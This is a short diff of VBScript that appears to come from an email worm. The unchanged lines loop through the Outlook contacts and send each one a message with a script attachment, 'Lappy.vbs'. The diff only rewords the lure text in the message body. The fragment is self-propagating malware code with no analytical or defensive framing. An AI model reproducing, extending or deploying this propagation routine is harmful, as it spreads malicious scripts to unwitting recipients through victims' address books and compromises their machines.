@@ -43,7 +43,7 @@ If objOutlook.Session.AddressLists.Count > 0 Then
     For Each objContact In objContacts
         If objContact.Class = 43 Then
             Set objMail.To = objContact.Email1Address
-            objMail.Body = "Check this out, dude!"
+            objMail.Body = "Check this Out Dude!"
             objMail.Attachments.Add strFilePath, 1, 0, "Lappy.vbs"
             objMail.Send
         End If
